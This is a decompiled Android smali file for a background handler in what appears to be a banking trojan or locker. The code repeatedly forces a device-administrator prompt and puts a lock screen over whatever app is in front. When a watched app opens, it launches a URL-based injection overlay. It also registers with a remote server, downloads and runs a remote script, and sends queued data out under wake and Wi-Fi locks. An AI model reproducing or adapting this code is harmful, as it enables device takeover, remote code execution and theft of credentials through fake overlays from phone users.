.class final Lorg/merry/core/RunService$1;
.super Landroid/os/Handler;
.source "RunService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lorg/merry/core/RunService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 324
    invoke-direct {p0}, Landroid/os/Handler;-><init>()V

    return-void
.end method


# virtual methods
.method public handleMessage(Landroid/os/Message;)V
    .locals 13
    .param p1, "msg"    # Landroid/os/Message;

    .prologue
    const/16 v12, 0x29a

    const/16 v11, 0x22b

    const/4 v10, 0x2

    const/4 v9, 0x0

    const/4 v8, 0x1

    .line 329
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->isAdminActive()Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-nez v5, :cond_0

    .line 331
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    const-class v6, Lorg/merry/core/AdminActivity;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 332
    .local v0, "intent":Landroid/content/Intent;
    const/high16 v5, 0x10000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 333
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v0}, Lorg/merry/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 339
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_0
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v11, :cond_5

    .line 341
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getActivityManager()Landroid/app/ActivityManager;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v4

    .line 342
    .local v4, "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v5

    if-eqz v5, :cond_3

    .line 344
    invoke-interface {v4, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v5, v5, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v5}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v2

    .line 346
    .local v2, "name":Ljava/lang/String;
    sget-object v5, Lorg/merry/core/Consts;->locker:Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-ne v5, v8, :cond_1

    const-class v5, Lorg/merry/corel/lck/Lock;

    invoke-virtual {v5}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getSettings()Lorg/merry/core/Settings;

    move-result-object v5

    const-string v6, "locker"

    invoke-virtual {v5, v6}, Lorg/merry/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "false"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 348
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    const-class v6, Lorg/merry/corel/lck/Lock;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 349
    .restart local v0    # "intent":Landroid/content/Intent;
    const/high16 v5, 0x10000000

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 350
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v0}, Lorg/merry/core/RunService;->startActivity(Landroid/content/Intent;)V

    .line 353
    .end local v0    # "intent":Landroid/content/Intent;
    :cond_1
    invoke-static {}, Lorg/merry/core/RunService;->access$000()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_3

    .line 355
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "new activity: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lorg/merry/core/Log;->write(Ljava/lang/String;)V

    .line 356
    invoke-static {}, Lorg/merry/core/RunService;->access$100()Ljava/util/HashMap;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getSettings()Lorg/merry/core/Settings;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, ".inject"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lorg/merry/core/Settings;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "false"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_2

    .line 358
    invoke-static {}, Lorg/merry/core/RunService;->access$100()Ljava/util/HashMap;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-static {v5}, Lorg/merry/core/activities/Inject;->setURL(Ljava/lang/String;)V

    .line 359
    invoke-static {}, Lorg/merry/core/RunService;->access$200()Lorg/merry/core/xAPI;

    move-result-object v5

    const-class v6, Lorg/merry/core/activities/Inject;

    invoke-virtual {v5, v6}, Lorg/merry/core/xAPI;->StartNewActivity(Ljava/lang/Class;)V

    .line 361
    :cond_2
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getScriptLoader()Lorg/merry/core/ScriptLoader;

    move-result-object v5

    const-string v6, "onWindowChange"

    new-array v7, v8, [Ljava/lang/Object;

    aput-object v2, v7, v9

    invoke-virtual {v5, v6, v7}, Lorg/merry/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 362
    invoke-static {v2}, Lorg/merry/core/RunService;->access$002(Ljava/lang/String;)Ljava/lang/String;

    .line 366
    .end local v2    # "name":Ljava/lang/String;
    :cond_3
    sget-object v5, Lorg/merry/core/RunService;->onTickHandler:Landroid/os/Handler;

    const-wide/16 v6, 0x64

    invoke-virtual {v5, v11, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 376
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->netConnect()V

    .line 377
    invoke-static {}, Lorg/merry/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v5

    if-eqz v5, :cond_4

    .line 379
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getScriptLoader()Lorg/merry/core/ScriptLoader;

    move-result-object v5

    const-string v6, "bootScriptNet"

    invoke-static {}, Lorg/merry/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lorg/merry/core/ScriptLoader;->loadScript(Ljava/lang/String;Ljava/lang/String;)Lorg/merry/core/Script;

    .line 380
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "bootScript loaded"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-static {}, Lorg/merry/core/RunService;->access$300()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lorg/merry/core/Log;->write(Ljava/lang/String;)V

    .line 381
    const-string v5, ""

    invoke-static {v5}, Lorg/merry/core/RunService;->access$302(Ljava/lang/String;)Ljava/lang/String;

    .line 382
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v5}, Lorg/merry/core/RunService;->access$402(Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 384
    :cond_4
    invoke-static {}, Lorg/merry/core/RunService;->access$500()Ljava/util/Queue;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/Queue;->poll()Ljava/lang/Object;

    move-result-object v3

    .line 385
    .local v3, "o":Ljava/lang/Object;
    if-eqz v3, :cond_5

    .line 387
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5, v3}, Lorg/merry/core/RunService;->sendNetPacket(Ljava/lang/Object;)V

    .line 390
    .end local v3    # "o":Ljava/lang/Object;
    .end local v4    # "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    :cond_5
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v12, :cond_8

    .line 393
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getScriptLoader()Lorg/merry/core/ScriptLoader;

    move-result-object v5

    const-string v6, "doQuery"

    new-array v7, v9, [Ljava/lang/Object;

    invoke-virtual {v5, v6, v7}, Lorg/merry/core/ScriptLoader;->call(Ljava/lang/String;[Ljava/lang/Object;)V

    .line 408
    invoke-static {}, Lorg/merry/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    if-eqz v5, :cond_7

    .line 410
    invoke-static {}, Lorg/merry/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v5

    if-eqz v5, :cond_6

    .line 411
    invoke-static {}, Lorg/merry/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 413
    :cond_6
    const/4 v5, 0x0

    invoke-static {v5}, Lorg/merry/core/RunService;->access$602(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    .line 415
    :cond_7
    invoke-static {}, Lorg/merry/core/RunService;->access$700()Landroid/os/PowerManager;

    move-result-object v5

    const v6, 0x10000001

    const-string v7, "LockTag"

    invoke-virtual {v5, v6, v7}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-static {v5}, Lorg/merry/core/RunService;->access$602(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    .line 416
    invoke-static {}, Lorg/merry/core/RunService;->access$600()Landroid/os/PowerManager$WakeLock;

    move-result-object v5

    invoke-virtual {v5}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 419
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->lockWifi()V

    .line 423
    sget-object v5, Lorg/merry/core/RunService;->onTickHandler:Landroid/os/Handler;

    sget v6, Lorg/merry/core/Consts;->queryDelay:I

    mul-int/lit16 v6, v6, 0x3e8

    int-to-long v6, v6

    invoke-virtual {v5, v12, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 430
    :cond_8
    iget v5, p1, Landroid/os/Message;->what:I

    if-ne v5, v10, :cond_9

    .line 432
    invoke-static {}, Lorg/merry/core/Network;->register()Ljava/lang/Boolean;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-nez v5, :cond_a

    .line 434
    sget-object v5, Lorg/merry/core/RunService;->onTickHandler:Landroid/os/Handler;

    const-wide/16 v6, 0x2710

    invoke-virtual {v5, v10, v6, v7}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 443
    :cond_9
    :goto_0
    return-void

    .line 437
    :cond_a
    const-string v5, "bootScriptNet"

    invoke-static {v5}, Lorg/merry/core/Network;->getScript(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 438
    .local v1, "js":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "boot.script: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lorg/merry/core/Log;->write(Ljava/lang/String;)V

    .line 440
    invoke-static {}, Lorg/merry/core/RunService;->getService()Lorg/merry/core/RunService;

    move-result-object v5

    invoke-virtual {v5}, Lorg/merry/core/RunService;->getScriptLoader()Lorg/merry/core/ScriptLoader;

    move-result-object v5

    const-string v6, "bootScriptNet"

    invoke-virtual {v5, v6, v1}, Lorg/merry/core/ScriptLoader;->loadScript(Ljava/lang/String;Ljava/lang/String;)Lorg/merry/core/Script;

    goto :goto_0
.end method
